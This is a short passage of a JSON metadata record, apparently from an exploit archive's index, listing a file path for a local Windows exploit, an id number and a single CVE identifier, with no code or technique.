    "filename": "platforms/windows/local/35993.c", 
    "id": "35993", 
    "cves": [
        "CVE-2014-9632"
    ]
}